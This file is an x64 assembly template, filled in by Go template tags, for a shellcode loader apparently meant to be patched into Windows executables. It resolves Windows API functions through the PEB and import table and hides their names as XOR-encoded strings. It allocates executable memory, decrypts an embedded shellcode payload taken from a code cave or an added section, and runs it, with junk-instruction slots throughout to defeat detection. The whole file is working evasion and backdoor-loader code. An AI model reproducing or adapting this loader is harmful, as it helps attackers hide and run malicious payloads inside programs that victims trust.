.code64

// rdi store address of ImageBaseAddress
// rsi store address of kernel32.dll
// rbx store address of LoadLibrary
// rbp store address of GetProcAddress
// [rsp+0x08] store address of allocated memory page
// [rsp+0x10] store address of VirtualAlloc
// [rsp+0x18] store address of VirtualFree
// [rsp+0x20] store address of VirtualProtect
// [rsp+0x28] store address of CreateThread
// [rsp+0x30] store address of WaitForSingleObject

entry:
// ================================ prepare environment ================================

  // ensure stack is 16 bytes aligned
  push rbp                                                     {{igi}}
  mov rbp, rsp                                                 {{igi}}
  and rsp, 0xFFFFFFFFFFFFFFF0                                  {{igi}}
  push rbp                                                     {{igi}}

  // reserve stack for store variables
  sub rsp, 0x48                                                {{igi}}

// =============================== get procedure address ===============================

{{if .LackProcedure}}
  // push kernel32 module name to stack
  mov {{.Reg.rax}}, {{index .Kernel32DLLDB  0}}                {{igi}}
  mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}                {{igi}}
  xor {{.Reg.rax}}, {{.Reg.r8}}                                {{igi}}
  push {{.Reg.rax}}                                            {{igi}}
  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB  1}}                {{igi}}
  mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}                {{igi}}
  xor {{.Reg.rbx}}, {{.Reg.r9}}                                {{igi}}
  push {{.Reg.rbx}}                                            {{igi}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.rcx}}, {{index .Kernel32DLLDB  2}}              {{igi}}
    mov {{.Reg.r10}}, {{index .Kernel32DLLKey 2}}              {{igi}}
    xor {{.Reg.rcx}}, {{.Reg.r10}}                             {{igi}}
    push {{.Reg.rcx}}                                          {{igi}}
    mov {{.Reg.rdx}}, {{index .Kernel32DLLDB  3}}              {{igi}}
    mov {{.Reg.r11}}, {{index .Kernel32DLLKey 3}}              {{igi}}
    xor {{.Reg.rdx}}, {{.Reg.r11}}                             {{igi}}
    push {{.Reg.rdx}}                                          {{igi}}
  {{end}}

  // get pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}                               {{igi}}
  mov {{.Reg.rax}}, 0x60                                       {{igi}}
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]                          {{igi}}
  // store image base address
  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]                     {{igi}}

  // read the LoadLibraryA/W form IAT
  mov {{.RegN.rbx}}, {{.RegN.rdi}}                             {{igi}}
  add {{.RegN.rbx}}, {{hex .LoadLibrary}}                      {{igi}}
  mov {{.RegN.rbx}}, [{{.RegN.rbx}}]                           {{igi}}

  // load kernel32.dll
  mov rcx, rsp         {{igi}} // lpLibFileName
  sub rsp, 0x20        {{igi}} // reserve stack for call convention
  call {{.RegN.rbx}}   {{igi}} // call LoadLibraryA/W
  add rsp, 0x20        {{igi}} // restore stack for call convention

  // store the handle of kernel32.dll
  mov {{.RegN.rsi}}, rax                                       {{igi}}

  // restore stack for kernel32 module name
  {{if .LoadLibraryWOnly}}
    add rsp, 4*8                                               {{igi}}
  {{else}}
    add rsp, 2*8                                               {{igi}}
  {{end}}

  // read the GetProcAddress form IAT
  mov {{.RegV.rax}}, {{.RegN.rdi}}                             {{igi}}
  add {{.RegV.rax}}, {{hex .GetProcAddress}}                   {{igi}}
  mov {{.RegN.rbp}}, [{{.RegV.rax}}]                           {{igi}}

  // get procedure address of VirtualAlloc
  {{if .LackVirtualAlloc}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualAllocDB  0}}            {{igi}}
    mov {{.RegV.r8}},  {{index .VirtualAllocKey 0}}            {{igi}}
    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{igi}}
    push {{.RegV.rax}}                                         {{igi}}
    mov {{.RegV.rcx}}, {{index .VirtualAllocDB  1}}            {{igi}}
    mov {{.RegV.r9}},  {{index .VirtualAllocKey 1}}            {{igi}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
    push {{.RegV.rcx}}                                         {{igi}}
    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
    mov rdx, rsp             {{igi}} // lpProcName
    sub rsp, 0x20            {{igi}} // reserve stack for call convention
    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
    add rsp, 0x20            {{igi}} // restore stack for call convention
    // restore stack for procedure name
    add rsp, 2*8                                               {{igi}}
    // store procedure address to stack
    mov [rsp+0x10], rax                                        {{igi}}
  {{else}}
    mov {{.RegV.rcx}}, {{.RegN.rdi}}                           {{igi}}
    add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                   {{igi}}
    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                         {{igi}}
    mov [rsp+0x10], {{.RegV.rcx}}                              {{igi}}
  {{end}}

  // get procedure address of VirtualFree
  {{if .LackVirtualFree}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualFreeDB  0}}             {{igi}}
    mov {{.RegV.r8}},  {{index .VirtualFreeKey 0}}             {{igi}}
    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{igi}}
    push {{.RegV.rax}}                                         {{igi}}
    mov {{.RegV.rcx}}, {{index .VirtualFreeDB  1}}             {{igi}}
    mov {{.RegV.r9}},  {{index .VirtualFreeKey 1}}             {{igi}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
    push {{.RegV.rcx}}                                         {{igi}}
    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
    mov rdx, rsp             {{igi}} // lpProcName
    sub rsp, 0x20            {{igi}} // reserve stack for call convention
    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
    add rsp, 0x20            {{igi}} // restore stack for call convention
    // restore stack for procedure name
    add rsp, 2*8                                               {{igi}}
    // store procedure address to stack
    mov [rsp+0x18], rax                                        {{igi}}
  {{else}}
    mov {{.RegV.rcx}}, {{.RegN.rdi}}                           {{igi}}
    add {{.RegV.rcx}}, {{hex .VirtualFree}}                    {{igi}}
    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                         {{igi}}
    mov [rsp+0x18], {{.RegV.rcx}}                              {{igi}}
  {{end}}

  // get procedure address of VirtualProtect
  {{if .LackVirtualProtect}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualProtectDB  0}}          {{igi}}
    mov {{.RegV.r8}},  {{index .VirtualProtectKey 0}}          {{igi}}
    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{igi}}
    push {{.RegV.rax}}                                         {{igi}}
    mov {{.RegV.rcx}}, {{index .VirtualProtectDB  1}}          {{igi}}
    mov {{.RegV.r9}},  {{index .VirtualProtectKey 1}}          {{igi}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
    push {{.RegV.rcx}}                                         {{igi}}
    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
    mov rdx, rsp             {{igi}} // lpProcName
    sub rsp, 0x20            {{igi}} // reserve stack for call convention
    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
    add rsp, 0x20            {{igi}} // restore stack for call convention
    // restore stack for procedure name
    add rsp, 2*8                                               {{igi}}
    // store procedure address to stack
    mov [rsp+0x20], rax                                        {{igi}}
  {{else}}
    mov {{.RegV.rdx}}, {{.RegN.rdi}}                           {{igi}}
    add {{.RegV.rdx}}, {{hex .VirtualProtect}}                 {{igi}}
    mov {{.RegV.rdx}}, [{{.RegV.rdx}}]                         {{igi}}
    mov [rsp+0x20], {{.RegV.rdx}}                              {{igi}}
  {{end}}

  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    {{if .LackCreateThread}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .CreateThreadDB  0}}          {{igi}}
      mov {{.RegV.r8}},  {{index .CreateThreadKey 0}}          {{igi}}
      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{igi}}
      push {{.RegV.rax}}                                       {{igi}}
      mov {{.RegV.rcx}}, {{index .CreateThreadDB  1}}          {{igi}}
      mov {{.RegV.r9}},  {{index .CreateThreadKey 1}}          {{igi}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{igi}}
      push {{.RegV.rcx}}                                       {{igi}}
      mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
      mov rdx, rsp             {{igi}} // lpProcName
      sub rsp, 0x20            {{igi}} // reserve stack for call convention
      call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
      add rsp, 0x20            {{igi}} // restore stack for call convention
      // restore stack for procedure name
      add rsp, 2*8                                             {{igi}}
      // store procedure address to stack
      mov [rsp+0x28], rax                                      {{igi}}
    {{else}}
      mov {{.RegV.r8}}, {{.RegN.rdi}}                          {{igi}}
      add {{.RegV.r8}}, {{hex .CreateThread}}                  {{igi}}
      mov {{.RegV.r8}}, [{{.RegV.r8}}]                         {{igi}}
      mov [rsp+0x28], {{.RegV.r8}}                             {{igi}}
    {{end}}
  {{end}}

  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    {{if .LackWaitForSingleObject}}
      // ensure stack is 16 bytes aligned
      push {{.RegV.rax}}                                       {{igi}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .WaitForSingleObjectDB  0}}   {{igi}}
      mov {{.RegV.r8}},  {{index .WaitForSingleObjectKey 0}}   {{igi}}
      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{igi}}
      push {{.RegV.rax}}                                       {{igi}}
      mov {{.RegV.rcx}}, {{index .WaitForSingleObjectDB  1}}   {{igi}}
      mov {{.RegV.r9}},  {{index .WaitForSingleObjectKey 1}}   {{igi}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{igi}}
      push {{.RegV.rcx}}                                       {{igi}}
      mov {{.RegV.rdx}}, {{index .WaitForSingleObjectDB  2}}   {{igi}}
      mov {{.RegV.r10}}, {{index .WaitForSingleObjectKey 2}}   {{igi}}
      xor {{.RegV.rdx}}, {{.RegV.r10}}                         {{igi}}
      push {{.RegV.rdx}}                                       {{igi}}
      mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
      mov rdx, rsp             {{igi}} // lpProcName
      sub rsp, 0x20            {{igi}} // reserve stack for call convention
      call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
      add rsp, 0x20            {{igi}} // restore stack for call convention
      // restore stack for procedure name
      add rsp, 4*8                                             {{igi}}
      // store procedure address to stack
      mov [rsp+0x30], rax                                      {{igi}}
    {{else}}
      mov {{.RegV.r9}}, {{.RegN.rdi}}                          {{igi}}
      add {{.RegV.r9}}, {{hex .WaitForSingleObject}}           {{igi}}
      mov {{.RegV.r9}}, [{{.RegV.r9}}]                         {{igi}}
      mov [rsp+0x30], {{.RegV.r9}}                             {{igi}}
    {{end}}
  {{end}}

{{else}}
  // get pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}                               {{igi}}
  mov {{.Reg.rax}}, 0x60                                       {{igi}}
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]                          {{igi}}
  // store image base address
  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]                     {{igi}}
  // get procedure address of VirtualAlloc
  mov {{.RegV.rcx}}, {{.RegN.rdi}}                             {{igi}}
  add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                     {{igi}}
  mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                           {{igi}}
  mov [rsp+0x10], {{.RegV.rcx}}                                {{igi}}
  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    mov {{.RegV.rcx}}, {{.RegN.rdi}}                           {{igi}}
    add {{.RegV.rcx}}, {{hex .VirtualFree}}                    {{igi}}
    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                         {{igi}}
    mov [rsp+0x18], {{.RegV.rcx}}                              {{igi}}
  {{end}}
  // get procedure address of VirtualProtect
  mov {{.RegV.rdx}}, {{.RegN.rdi}}                             {{igi}}
  add {{.RegV.rdx}}, {{hex .VirtualProtect}}                   {{igi}}
  mov {{.RegV.rdx}}, [{{.RegV.rdx}}]                           {{igi}}
  mov [rsp+0x20], {{.RegV.rdx}}                                {{igi}}
  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    mov {{.RegV.r8}}, {{.RegN.rdi}}                            {{igi}}
    add {{.RegV.r8}}, {{hex .CreateThread}}                    {{igi}}
    mov {{.RegV.r8}}, [{{.RegV.r8}}]                           {{igi}}
    mov [rsp+0x28], {{.RegV.r8}}                               {{igi}}
  {{end}}
  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    mov {{.RegV.r9}}, {{.RegN.rdi}}                            {{igi}}
    add {{.RegV.r9}}, {{hex .WaitForSingleObject}}             {{igi}}
    mov {{.RegV.r9}}, [{{.RegV.r9}}]                           {{igi}}
    mov [rsp+0x30], {{.RegV.r9}}                               {{igi}}
  {{end}}
{{end}} // LackProcedure

// ================================ prepare memory page ================================

  // allocate memory for shellcode
  mov rax, [rsp+0x10]                          {{igi}} // address of VirtualAddress
  xor rcx, rcx                                 {{igi}} // lpAddress
  mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
  mov r8, 0x3000                               {{igi}} // flAllocationType MEM_RESERVE|MEM_COMMIT
  mov r9, 0x04                                 {{igi}} // flProtect PAGE_READWRITE
  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
  call rax                                     {{igi}} // call GetProcAddress
  add rsp, 0x20                                {{igi}} // restore stack for call convention

  // store allocated memory address
  mov [rsp+0x08], rax                          {{igi}}

  // padding garbage data to page
  mov {{.RegV.rdx}}, rax                       {{igi}}
  mov {{.RegV.rcx}}, {{hex .EntryOffset}}      {{igi}}
  // calculate a random seed from registers
  add {{.RegV.rax}}, {{.Reg.rbx}}              {{igi}}
  add {{.RegV.rax}}, {{.Reg.rcx}}              {{igi}}
  add {{.RegV.rax}}, {{.Reg.rdx}}              {{igi}}
  add {{.RegV.rax}}, {{.Reg.rsi}}              {{igi}}
  add {{.RegV.rax}}, {{.Reg.rdi}}              {{igi}}
  add {{.RegV.rax}}, {{.Reg.r8}}               {{igi}}
  add {{.RegV.rax}}, {{.Reg.r9}}               {{igi}}
  add {{.RegV.rax}}, {{.Reg.r10}}              {{igi}}
  add {{.RegV.rax}}, {{.Reg.r11}}              {{igi}}
 loop_padding:
  // it will waste some loop but clean code
  call xor_shift                               {{igi}}
  mov [{{.RegV.rdx}}], {{.RegV.rax}}           {{igi}}
  // check padding garbage is finish
  inc {{.RegV.rdx}}                            {{igi}}
  dec {{.RegV.rcx}}                            {{igi}}
  jnz loop_padding                             {{igi}}

  // adjust memory region protect
  mov rax, [rsp+0x20]                          {{igi}} // address of VirtualProtect
  mov rcx, [rsp+0x08]                          {{igi}} // lpAddress
  sub rsp, 0x10                                {{igi}} // for store old protect
  mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
  mov r8, 0x40                                 {{igi}} // flNewProtect PAGE_EXECUTE_READWRITE
  mov r9, rsp                                  {{igi}} // lpflOldProtect
  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
  call rax                                     {{igi}} // call GetProcAddress
  add rsp, 0x20                                {{igi}} // restore stack for call convention
  add rsp, 0x10                                {{igi}} // restore stack for old protect

// ================================= prepare shellcode =================================

{{if .CodeCave}}
  // extract encrypted shellcode from code cave
  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}                     {{igi}}
  mov {{.RegN.rdi}}, [rsp+0x08]                                {{igi}}
  add {{.RegN.rdi}}, {{hex .EntryOffset}}                      {{igi}}
  {{STUB CodeCaveMode STUB}}
{{end}} // CodeCave

{{if or .ExtendSection .CreateSection}}
  // save rsi and rdi
  push rsi                                                     {{igi}}
  push rdi                                                     {{igi}}

  // extract encrypted shellcode from section
  mov rsi, {{.RegN.rdi}}                                       {{igi}}
  add rsi, {{hex .ShellcodeOffset}}                            {{igi}}
  mov rdi, [rsp+0x18]                                          {{igi}}
  add rdi, {{hex .EntryOffset}}                                {{igi}}
  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}                    {{igi}}
 loop_extract:
  movsb                                                        {{igi}}
  inc rsi                                                      {{igi}}
  // check extract shellcode is finish
  dec {{.RegV.rcx}}                                            {{igi}}
  jnz loop_extract                                             {{igi}}

  // restore rdi and rsi
  pop rdi                                                      {{igi}}
  pop rsi                                                      {{igi}}

  // decrypt shellcode in the memory page
  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}                     {{igi}}
  mov {{.RegV.rdx}}, [rsp+0x08]                                {{igi}}
  add {{.RegV.rdx}}, {{hex .EntryOffset}}                      {{igi}}
  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}                    {{igi}}
 loop_decrypt:
  mov {{.RegV.r8}}, [{{.RegV.rdx}}]                            {{igi}}
  xor {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
  mov [{{.RegV.rdx}}], {{.RegV.r8}}                            {{igi}}
  // update the key with xorshift64
  call xor_shift                                               {{igi}}
  // check decrypt shellcode is finish
  add {{.RegV.rdx}}, 8                                         {{igi}}
  sub {{.RegV.rcx}}, 8                                         {{igi}}
  jnz loop_decrypt                                             {{igi}}
{{end}} // SectionMode

// ================================== execute shellcode ==================================

{{if .NeedCreateThread}}
  mov rax, [rsp+0x28]            {{igi}} // address of CreateThread
  mov r10, [rsp+0x08]            {{igi}} // address of memory page
  add r10, {{hex .EntryOffset}}  {{igi}} // address of shellcode

  sub rsp, 0x10                  {{igi}} // reserve stack for argument
  xor rcx, rcx                   {{igi}} // lpThreadAttributes
  xor rdx, rdx                   {{igi}} // dwStackSize
  mov r8, r10                    {{igi}} // lpStartAddress
  xor r9, r9                     {{igi}} // lpParameter
  mov [rsp+0], rcx               {{igi}} // dwCreationFlags
  mov [rsp+8], rcx               {{igi}} // lpThreadId
  sub rsp, 0x20                  {{igi}} // reserve stack for call convention
  call rax                       {{igi}} // call CreateThread
  add rsp, 0x20                  {{igi}} // restore stack for call convention
  add rsp, 0x10                  {{igi}} // restore stack for argument

  {{if .NeedWaitThread}}
    mov rcx, rax                 {{igi}} // hHandle, hThread
    mov rdx, 0xFFFFFFFF          {{igi}} // dwMilliseconds, INFINITE
    mov rax, [rsp+0x30]          {{igi}} // address of WaitForSingleObject

    sub rsp, 0x20                {{igi}} // reserve stack for call convention
    call rax                     {{igi}} // call WaitForSingleObject
    add rsp, 0x20                {{igi}} // restore stack for call convention
  {{end}}
{{else}}
  // get the shellcode entry point
  mov {{.RegV.rax}}, [rsp+0x08]                                {{igi}}
  add {{.RegV.rax}}, {{hex .EntryOffset}}                      {{igi}}
  // call the shellcode
  sub rsp, 0x20                                                {{igi}}
  call {{.RegV.rax}}                                           {{igi}}
  add rsp, 0x20                                                {{igi}}
{{end}}

// =================================== erase shellcode ===================================

{{if .NeedEraseShellcode}}

{{end}}

// ================================== clean environment ==================================

  // restore stack for store variables
  add rsp, 0x48                                                {{igi}}

  // restore stack and rbp
  pop rbp                                                      {{igi}}
  mov rsp, rbp                                                 {{igi}}
  pop rbp                                                      {{igi}}

  // mark the end of loader
  {{db .EndOfLoader}}

xor_shift:
  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
  shl {{.RegV.r8}}, 13                                         {{igi}}
  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{igi}}
  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
  shr {{.RegV.r8}}, 7                                          {{igi}}
  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{igi}}
  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{igi}}
  shl {{.RegV.r8}}, 17                                         {{igi}}
  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{igi}}
  ret                                                          {{igi}}
